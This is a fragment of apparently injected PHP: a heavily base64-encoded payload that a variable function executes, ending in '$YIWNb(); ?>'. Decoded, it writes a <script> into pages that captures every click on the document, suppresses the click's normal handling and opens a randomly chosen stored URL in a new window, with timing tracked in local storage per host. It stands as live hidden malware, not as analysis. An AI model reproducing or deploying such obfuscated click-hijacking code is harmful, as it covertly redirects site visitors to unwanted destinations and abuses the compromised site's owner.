1lsTmpNbE5qRWxOelFsTmprbE5rWWxOa1VsTkRZbE56SWxOa1lsTmtRbE5UTWxOelFsTmtZbE56SWxOakVsTmpjbE5qVWxNamdsTnpRbE5qRWxOeklsTmpjbE5qVWxOelFsTnpNbE1qa2xNMElsTUVRbE1FRWxNakFsTWpBbE1qQWxNakFsTnpNbE5qRWxOellsTmpVbE5UUWxOakVsTnpJbE5qY2xOalVsTnpRbE5FTWxOa1lsTmpNbE5qRWxOelFsTmprbE5rWWxOa1VsTnpNbE5UUWxOa1lsTlRNbE56UWxOa1lsTnpJbE5qRWxOamNsTmpVbE1qZ2xOelFsTmpFbE56SWxOamNsTmpVbE56UWxOek1sTWprbE0wSWxNRVFsTUVFbE1FUWxNRUVsTWpBbE1qQWxNakFsTWpBbE5qWWxOelVsTmtVbE5qTWxOelFsTmprbE5rWWxOa1VsTWpBbE5qY2xOa01sTmtZbE5qSWxOakVsTmtNbE5ETWxOa01sTmprbE5qTWxOa0lsTWpnbE5qVWxOellsTmpVbE5rVWxOelFsTWprbE1qQWxOMElsTUVRbE1FRWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE5qVWxOellsTmpVbE5rVWxOelFsTWtVbE56TWxOelFsTmtZbE56QWxOVEFsTnpJbE5rWWxOekFsTmpFbE5qY2xOakVsTnpRbE5qa2xOa1lsTmtVbE1qZ2xNamtsTTBJbE1FUWxNRUVsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxOak1sTmtZbE5rVWxOek1sTnpRbE1qQWxOamdsTmtZbE56TWxOelFsTWpBbE0wUWxNakFsTmtNbE5rWWxOak1sTmpFbE56UWxOamtsTmtZbE5rVWxNa1VsTmpnbE5rWWxOek1sTnpRbE0wSWxNRVFsTUVFbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTmtNbE5qVWxOelFsTWpBbE5rVWxOalVsTnpjbE5FTWxOa1lsTmpNbE5qRWxOelFsTmprbE5rWWxOa1VsTWpBbE0wUWxNakFsTmpjbE5qVWxOelFsTlRJbE5qRWxOa1VsTmpRbE5rWWxOa1FsTkVNbE5rWWxOak1sTmpFbE56UWxOamtsTmtZbE5rVWxORFlsTnpJbE5rWWxOa1FsTlRNbE56UWxOa1lsTnpJbE5qRWxOamNsTmpVbE1qZ2xOelFsTmpFbE56SWxOamNsTmpVbE56UWxOek1sTWprbE0wSWxNRVFsTUVFbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTmpNbE5rWWxOa1VsTnpNbE56UWxNakFsTmtVbE5rWWxOemNsTkRRbE5qRWxOelFsTmpVbE1qQWxNMFFsTWpBbE5EUWxOakVsTnpRbE5qVWxNa1VsTnpBbE5qRWxOeklsTnpNbE5qVWxNamdsTmtVbE5qVWxOemNsTWpBbE5EUWxOakVsTnpRbE5qVWxNamdsTWprbE1qa2xNMElsTUVRbE1FRWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE5qTWxOa1lsTmtVbE56TWxOelFsTWpBbE56TWxOakVsTnpZbE5qVWxOalFsTkRRbE5qRWxOelFsTmpVbE5EWWxOa1lsTnpJbE5FUWxOamtsTmtVbE56UWxOek1sTWpBbE0wUWxNakFsTmpjbE5qVWxOelFsTlRRbE5qa2xOa1FsTmpVbE5UTWxOelFsTmtZbE56SWxOakVsTmpjbE5qVWxNamdsTmpBbE1qUWxOMElsTmpnbE5rWWxOek1sTnpRbE4wUWxNa1FsTmtRbE5rVWxOelFsTnpNbE5qQWxNamtsTTBJbE1FUWxNRUVsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxOak1sTmtZbE5rVWxOek1sTnpRbE1qQWxOek1sTmpFbE56WWxOalVsTmpRbE5EUWxOakVsTnpRbE5qVWxORFlsTmtZbE56SWxORGdsTmtZbE56VWxOeklsTnpNbE1qQWxNMFFsTWpBbE5qY2xOalVsTnpRbE5UUWxOamtsTmtRbE5qVWxOVE1sTnpRbE5rWWxOeklsTmpFbE5qY2xOalVsTWpnbE5qQWxNalFsTjBJbE5qZ2xOa1lsTnpNbE56UWxOMFFsTWtRbE5qZ2xOelVsTnpJbE56TWxOakFsTWprbE0wSWxNRVFsTUVFbE1FUWxNRUVsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxOamtsTmpZbE1qQWxNamdsTnpNbE5qRWxOellsTmpVbE5qUWxORFFsTmpFbE56UWxOalVsTkRZbE5rWWxOeklsTkVRbE5qa2xOa1VsTnpRbE56TWxNakFsTWpZbE1qWWxNakFsTnpNbE5qRWxOellsTmpVbE5qUWxORFFsTmpFbE56UWxOalVsTkRZbE5rWWxOeklsTkRnbE5rWWxOelVsTnpJbE56TWxNamtsTWpBbE4wSWxNRVFsTUVFbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE56UWxOeklsTnprbE1qQWxOMElsTUVRbE1FRWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTmpNbE5rWWxOa1VsTnpNbE56UWxNakFsTnpNbE56UWxOa1lsTnpJbE5qRWxOamNsTmpVbE5EUWxOakVsTnpRbE5qVWxORFlsTmtZbE56SWxORVFsTmprbE5rVWxOelFsTnpNbE1qQWxNMFFsTWpBbE56QWxOakVsTnpJbE56TWxOalVsTkRrbE5rVWxOelFsTWpnbE56TWxOakVsTnpZbE5qVWxOalFsTkRRbE5qRWxOelFsTmpVbE5EWWxOa1lsTnpJbE5FUWxOamtsTmtVbE56UWxOek1sTWprbE0wSWxNRVFsTUVFbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxOak1sTmtZbE5rVWxOek1sTnpRbE1qQWxOek1sTnpRbE5rWWxOeklsTmpFbE5qY2xOalVsTkRRbE5qRWxOelFsTmpVbE5EWWxOa1lsTnpJbE5EZ2xOa1lsTnpVbE56SWxOek1sTWpBbE0wUWxNakFsTnpBbE5qRWxOeklsTnpNbE5qVWxORGtsTmtVbE56UWxNamdsTnpNbE5qRWxOellsTmpVbE5qUWxORFFsTmpFbE56UWxOalVsTkRZbE5rWWxOeklsTkRnbE5rWWxOelVsTnpJbE56TWxNamtsTTBJbE1FUWxNRUVsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE5qTWxOa1lsTmtVbE56TWxOelFsTWpBbE5rUWxOamtsTmtVbE56UWxOek1sTkRRbE5qa2xOallsTmpZbE1qQWxNMFFsTWpBbE5qY2xOalVsTnpRbE5FUWxOamtsTmtVbE56UWxOek1sTkRRbE5qa2xOallsTmpZbE1qZ2xOa1VsTmtZbE56Y2xORFFsTmpFbE56UWxOalVsTWtNbE1qQWxOek1sTnpRbE5rWWxOeklsTmpFbE5qY2xOalVsTkRRbE5qRWxOelFsTmpVbE5EWWxOa1lsTnpJbE5FUWxOamtsTmtVbE56UWxOek1sTWprbE0wSWxNRVFsTUVFbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxOak1sTmtZbE5rVWxOek1sTnpRbE1qQWxOamdsTmtZbE56VWxOeklsTnpNbE5EUWxOamtsTmpZbE5qWWxNakFsTTBRbE1qQWxOamNsTmpVbE56UWxORGdsTmtZbE56VWxOeklsTnpNbE5EUWxOamtsTmpZbE5qWWxNamdsTmtVbE5rWWxOemNsTkRRbE5qRWxOelFsTmpVbE1rTWxNakFsTnpNbE56UWxOa1lsTnpJbE5qRWxOamNsTmpVbE5EUWxOakVsTnpRbE5qVWxORFlsTmtZbE56SWxORGdsTmtZbE56VWxOeklsTnpNbE1qa2xNMElsTUVRbE1FRWxNRVFsTUVFbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxOamtsTmpZbE1qQWxNamdsTmpnbE5rWWxOelVsTnpJbE56TWxORFFsTmprbE5qWWxOallsTWpBbE0wVWxNMFFsTWpBbE5qRWxOa01sTmtNbE5rWWxOemNsTmpVbE5qUWxORGdsTmtZbE56VWxOeklsTnpNbE1qa2xNakFsTjBJbE1FUWxNRUVsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxOek1sTmpFbE56WWxOalVsTlRRbE5qRWxOeklsTmpjbE5qVWxOelFsTkVNbE5rWWxOak1sTmpFbE56UWxOamtsTmtZbE5rVWxOek1sTlRRbE5rWWxOVE1sTnpRbE5rWWxOeklsTmpFbE5qY2xOalVsTWpnbE56UWxOakVsTnpJbE5qY2xOalVsTnpRbE56TWxNamtsTTBJbE1FUWxNRUVsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxOek1sTmpVbE56UWxOVFFsTmprbE5rUWxOalVsTlRRbE5rWWxOVE1sTnpRbE5rWWxOeklsTmpFbE5qY2xOalVsTWpnbE5qQWxNalFsTjBJbE5qZ2xOa1lsTnpNbE56UWxOMFFsTWtRbE5qZ2xOelVsTnpJbE56TWxOakFsTWtNbE1qQWxOa1VsTmtZbE56Y2xORFFsTmpFbE56UWxOalVsTWprbE0wSWxNRVFsTUVFbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxOMFFsTUVRbE1FRWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTmprbE5qWWxNakFsTWpnbE5rUWxOamtsTmtVbE56UWxOek1sTkRRbE5qa2xOallsTmpZbE1qQWxNMFVsTTBRbE1qQWxOeklsTmpVbE56TWxOelFsTkVRbE5qa2xOa1VsTnpVbE56UWxOalVsTnpNbE1qa2xNakFsTjBJbE1FUWxNRUVsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxOamtsTmpZbE1qQWxNamdsTmtVbE5qVWxOemNsTkVNbE5rWWxOak1sTmpFbE56UWxOamtsTmtZbE5rVWxNamtsTWpBbE4wSWxNRVFsTUVFbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE56TWxOalVsTnpRbE5UUWxOamtsTmtRbE5qVWxOVFFsTmtZbE5UTWxOelFsTmtZbE56SWxOakVsTmpjbE5qVWxNamdsTmpBbE1qUWxOMElsTmpnbE5rWWxOek1sTnpRbE4wUWxNa1FsTmtRbE5rVWxOelFsTnpNbE5qQWxNa01sTWpBbE5rVWxOa1lsTnpjbE5EUWxOakVsTnpRbE5qVWxNamtsTTBJbE1FUWxNRUVsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTnpjbE5qa2xOa1VsTmpRbE5rWWxOemNsTWtVbE5rWWxOekFsTmpVbE5rVWxNamdsTmtVbE5qVWxOemNsTkVNbE5rWWxOak1sTmpFbE56UWxOamtsTmtZbE5rVWxNa01sTWpBbE1qSWxOVVlsTmpJbE5rTWxOakVsTmtVbE5rSWxNaklsTWprbE0wSWxNRVFsTUVFbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE56TWxOalVsTnpRbE5FTWxOa1lsTmpNbE5qRWxOelFsTmprbE5rWWxOa1VsTkRFbE56TWxOVFlsTmprbE56TWxOamtsTnpRbE5qVWxOalFsTWpnbE5rVWxOalVsTnpjbE5FTWxOa1lsTmpNbE5qRWxOelFsTmprbE5rWWxOa1VsTWprbE0wSWxNRVFsTUVFbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTjBRbE1FUWxNRUVsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE4wUWxNRVFsTUVFbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE4wUWxNakFsTmpNbE5qRWxOelFsTmpNbE5qZ2xNakFsTWpnbE5qVWxOeklsTnpJbE5rWWxOeklsTWprbE1qQWxOMElsTWpBbE56WWxOamtsTnpNbE5qa2xOelFsTkVVbE5qVWxOemNsTkVNbE5rWWxOak1sTmpFbE56UWxOamtsTmtZbE5rVWxNamdsTnpRbE5qRWxOeklsTmpjbE5qVWxOelFsTnpNbE1rTWxNakFsTmpnbE5rWWxOek1sTnpRbE1rTWxNakFsTmtVbE5rWWxOemNsTkRRbE5qRWxOelFsTmpVbE1qa2xNMElsTWpBbE4wUWxNRVFsTUVFbE1qQWxNakFsTWpBbE1qQWxNakFsTWpBbE1qQWxNakFsTjBRbE1qQWxOalVsTmtNbE56TWxOalVsTWpBbE4wSWxNakFsTnpZbE5qa2xOek1sTmprbE56UWxORVVsTmpVbE56Y2xORU1sTmtZbE5qTWxOakVsTnpRbE5qa2xOa1lsTmtVbE1qZ2xOelFsTmpFbE56SWxOamNsTmpVbE56UWxOek1sTWtNbE1qQWxOamdsTmtZbE56TWxOelFsTWtNbE1qQWxOa1VsTmtZbE56Y2xORFFsTmpFbE56UWxOalVsTWprbE0wSWxNakFsTjBRbE1FUWxNRUVsTWpBbE1qQWxNakFsTWpBbE4wUWxNRVFsTUVFbE1qQWxNakFsTWpBbE1qQWxOalFsTmtZbE5qTWxOelVsTmtRbE5qVWxOa1VsTnpRbE1rVWxOakVsTmpRbE5qUWxORFVsTnpZbE5qVWxOa1VsTnpRbE5FTWxOamtsTnpNbE56UWxOalVsTmtVbE5qVWxOeklsTWpnbE1qSWxOak1sTmtNbE5qa2xOak1sTmtJbE1qSWxNa01sTWpBbE5qY2xOa01sTmtZbE5qSWxOakVsTmtNbE5ETWxOa01sTmprbE5qTWxOa0lsTWprbE1FUWxNRUVsTjBRbE1qa2xNamdsTWprbE0wTWxNa1lsTnpNbE5qTWxOeklsTmprbE56QWxOelFsTTBVaUtTazhMM05qY21sd2REND0iKSk8L3NjcmlwdD4nOyB9IA==')); $YIWNb(); ?>